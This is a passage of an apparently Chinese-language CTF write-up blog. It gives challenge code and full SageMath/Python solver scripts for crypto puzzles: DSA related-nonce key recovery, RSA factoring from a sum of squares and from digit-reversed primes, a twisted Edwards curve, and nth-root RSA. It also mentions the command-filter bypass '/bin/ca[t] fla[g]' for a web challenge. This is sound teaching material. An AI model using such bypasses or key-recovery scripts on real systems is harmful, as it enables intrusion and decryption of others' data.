class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random,os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;***************&#125;&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;e = ?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(powmod(g, k, p) % q)</span><br><span class="line">    H = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">    s = <span class="built_in">int</span>((H + r * x) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (H,r,s)</span><br><span class="line"></span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = k1 ** <span class="number">2</span></span><br><span class="line">pri = bytes_to_long(msg)</span><br><span class="line">a = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">b = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">pub = (a, b, g, y)</span><br><span class="line"></span><br><span class="line">H1, r1, s1 = sign(pub, pri, k1)</span><br><span class="line"></span><br><span class="line">H2, r2, s2 = sign(pub, pri, k2)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = powmod(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">C = p**<span class="number">2</span> + q**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H1, r1, s1) = <span class="subst">&#123;H1&#125;</span>, <span class="subst">&#123;r1&#125;</span>, <span class="subst">&#123;s1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H2, r2, s2) = <span class="subst">&#123;H2&#125;</span>, <span class="subst">&#123;r2&#125;</span>, <span class="subst">&#123;s2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640</span></span><br><span class="line"><span class="string">(H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142</span></span><br><span class="line"><span class="string">c = 18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line"><span class="string">C = 179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>熟悉的签名——<code>DSA</code>，找了一圈，找到了<code>关系k攻击</code><br><img src="https://pic1.zhimg.com/80/v2-b9a34619a42f211a202b8fab91dd542a_1440w.png" alt=""><br><a href="http://www.cynthia99.link/index.php/archives/2426/">参考博客</a></p><p>现在差个平方和待解决，本来想用<code>sage</code>自带的<code>two_squares</code>，但出来的两个都不是素数，就很奇怪，说明这里的分解应该是没有满足特定的条件</p><p>那只能换一个打法了<br><a href="https://xz.aliyun.com/t/15424">解丢番图方程</a><br>貌似还有一个打法——<code>复数的模长</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers.diophantine.diophantine <span class="keyword">import</span> cornacchia</span><br><span class="line"></span><br><span class="line">p = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">q = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">(H1, r1, s1) = <span class="number">659787401883545685817457221852854226644541324571</span>, <span class="number">334878452864978819061930997065061937449464345411</span>, <span class="number">282119793273156214497433603026823910474682900640</span></span><br><span class="line">(H2, r2, s2) = <span class="number">156467414524100313878421798396433081456201599833</span>, <span class="number">584114556699509111695337565541829205336940360354</span>, <span class="number">827371522240921066790477048569787834877112159142</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class="line"></span><br><span class="line">f = s2*x^<span class="number">2</span>*r1 - s1*x*r2 - H2*r1 + H1*r2</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">int</span>(f.roots()[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">x = (s1*k - H1) * inverse(r1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x).decode())</span><br><span class="line">c = <span class="number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line">C = <span class="number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line">x1 = cornacchia(<span class="number">1</span>, <span class="number">1</span>, C)</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> x1:</span><br><span class="line">    <span class="keyword">assert</span> a**<span class="number">2</span>+b**<span class="number">2</span> == C</span><br><span class="line">    <span class="keyword">if</span> isPrime(a) <span class="keyword">and</span> isPrime(b):</span><br><span class="line">        p, q = a, b</span><br><span class="line">        <span class="built_in">print</span>(p,q)</span><br><span class="line">        n = p*q</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><p>emmm，后面比较了一下时间，在复数域下分解所需的时间是短很多的，原题可见<strong>Geek Challenge 2023 EzComplex</strong><br>$N=(p+qi)*(p-qi)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">N</span>):</span><br><span class="line">    <span class="comment">#将 N 转换为复数域上的整数</span></span><br><span class="line">    f = ZZ[I](N)</span><br><span class="line">    <span class="comment">#获取所有因子</span></span><br><span class="line">    divisors_f = divisors(f)</span><br><span class="line">    <span class="comment">#遍历所有因子，寻找满足条件的p和q</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> divisors_f:</span><br><span class="line">        a,b = d.real(), d.imag()</span><br><span class="line">        <span class="keyword">if</span> a**<span class="number">2</span> + b**<span class="number">2</span> == N:</span><br><span class="line">            p = <span class="built_in">abs</span>(<span class="built_in">int</span>(a))</span><br><span class="line">            q = <span class="built_in">abs</span>(<span class="built_in">int</span>(b))</span><br><span class="line">            <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h3 id="Curve"><a href="#Curve" class="headerlink" title="Curve"></a>Curve</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    (x1, y1) = P</span><br><span class="line">    (x2, y2) = Q</span><br><span class="line"></span><br><span class="line">    x3 = (x1*y2 + y1*x2) * inverse(<span class="number">1</span> + d*x1*x2*y1*y2, p) % p</span><br><span class="line">    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="number">1</span> - d*x1*x2*y1*y2, p) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, P</span>):</span><br><span class="line">    Q = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add(Q, P)</span><br><span class="line">        P = add(P, P)</span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">p = <span class="number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span></span><br><span class="line">a = <span class="number">362</span></span><br><span class="line">d = <span class="number">7</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">gx=bytes_to_long(<span class="string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;y&gt;=PolynomialRing(Zmod(p))</span><br><span class="line">f=(d*gx^<span class="number">2</span>-<span class="number">1</span>)*y^<span class="number">2</span>+(<span class="number">1</span>-a*gx^<span class="number">2</span>)</span><br><span class="line">gy=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (a*gx^<span class="number">2</span>+gy^<span class="number">2</span>)%p==(<span class="number">1</span>+d*gx^<span class="number">2</span>*gy^<span class="number">2</span>)%p</span><br><span class="line"></span><br><span class="line">G=(gx,gy)</span><br><span class="line"></span><br><span class="line">eG = mul(e, G)</span><br><span class="line"><span class="built_in">print</span>(eG)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span></span><br></pre></td></tr></table></figure><p>考点：<code>爱德华扭曲曲线</code></p><p>$ax^{2}+y^{2}\equiv 1+dx^{2}y^{2}(mod\ p)$</p><p><code>圆锥曲线</code>(不是椭圆曲线！！！)，吐了，然后去找了大半圈，没找到一篇能利用的</p><p>关于曲线的话，上一次印象比较深刻的是，羊城杯的两题椭圆曲线，然后也去看了一下，顺便复习一下，也是没能有进展，而且网上是比较少关于圆锥曲线的介绍的(有这玩意吗？我当时的想法就是这样的)<br>其实我应该想到映射这玩意的(属于是马后炮了)</p><p>赛后<code>Lst4r师傅</code>告诉我是这个<a href="https://en.wikipedia.org/wiki/Twisted_Edwards_curve">Twisted_Edwards_curve</a></p><p>我问他当时咋想到这个的，他说是羊城杯的时候，做那两题椭圆曲线的时候，翻到的，见过，所以有印象，好好好</p><p>然后解题脚本<a href="https://tangcuxiaojikuai.xyz/post/187210a7.html">糖醋小鸡块师傅收录曲线趣题</a></p><p>说起这个，也是有点内个了，我去师傅的博客搜<code>curve</code>的时候，点过了这篇，然后它刚好在第一题，我就没怎么注意，可能还是用的<code>Ctrl+f</code>，然后直接往下拉，结果就是完美错过了QWQ</p><p>后面看了出题人的<code>wp</code>，<code>羊城杯</code>，<code>灵感来源</code>，好好好</p><p>真是应了<code>Csome</code>那句话<br><strong>在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库</strong></p><h1 id="HECTF2024"><a href="#HECTF2024" class="headerlink" title="HECTF2024"></a>HECTF2024</h1><p>这次也是没时间充当<code>web手</code>了，一边打密码，一边写作业，真折磨</p><p>说实话还是挺想打<code>web</code>的，看了一下反序列化那题，感觉构造链子应该不难，重点是绕过，但我感觉给防死了，结果是要拿正则表达式匹配绕过啊，<code>/bin/ca[t] fla[g]</code>(不是单纯的<code>cat</code>哦)</p><p>真就，<strong>过滤的越严格，过滤的越简单</strong></p><p>说起来，正好最近的网络空间安全的课程实验打的<code>iwebsec</code>的靶场有命令过滤绕过，我自己也想到了正则表达式匹配，但这里大脑死机了，可能是事情太多了</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="迷茫的艾米莉"><a href="#迷茫的艾米莉" class="headerlink" title="迷茫的艾米莉"></a>迷茫的艾米莉</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏</span><br><span class="line">一天，她发现通往秘密花园的小径，入口却被封上了</span><br><span class="line">上面有一串密文</span><br><span class="line">Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c&#125;&#123;lr</span><br><span class="line">请输入密码帮助艾米莉探索秘密花园</span><br></pre></td></tr></table></figure><p>题目直接就告诉了你所有关键信息<br><img src="https://pic1.zhimg.com/80/v2-1ad756efbef37b149d62b73a955770b0_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-58a35075719f46e3bd7efc1b9aa24de9_1440w.png" alt=""></p><h3 id="翻一翻"><a href="#翻一翻" class="headerlink" title="翻一翻"></a>翻一翻</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">emirp</span>(<span class="params">x</span>):</span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x !=<span class="number">0</span>:</span><br><span class="line">        y = y*<span class="number">10</span> + x%<span class="number">10</span></span><br><span class="line">        x = x//<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = emirp(p)</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64encode(flag)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"><span class="string">c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>q是p的十进制数字反转(<code>emirp数</code>)<br><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">原题</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># we try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">10</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line">p, q = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span>, <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode()</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode())</span><br></pre></td></tr></table></figure><p>拓展：如果是二进制数的反转呢？<br><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">见La佬的这篇博客</a></p><h3 id="seven-more"><a href="#seven-more" class="headerlink" title="seven more"></a>seven more</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">nbits, multiplier</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span> * multiplier * getPrime(nbits // <span class="number">2</span>) * getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_prime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keys</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getMyPrime(nbits, <span class="number">1009</span> * <span class="number">7</span>)</span><br><span class="line">    q = getMyPrime(nbits, <span class="number">1009</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> p, q, n, e</span><br><span class="line"></span><br><span class="line">p, q, n, e = generate_keys(<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="number">101</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; n.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; q.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; p.bit_length()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line"><span class="comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line"><span class="comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line"><span class="comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br></pre></td></tr></table></figure><p>先感谢一波<code>T0ver.</code> 我滴神！</p><p>我们知道<code>e</code>与<code>phi</code>并不互素，可以考虑<code>AMM算法</code>，这里直接上<a href="https://tover.xyz/p/n-root-in-F/#2024-11-30%E6%9B%B4%E6%96%B0">师兄的科技</a></p><p>小改一下下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span 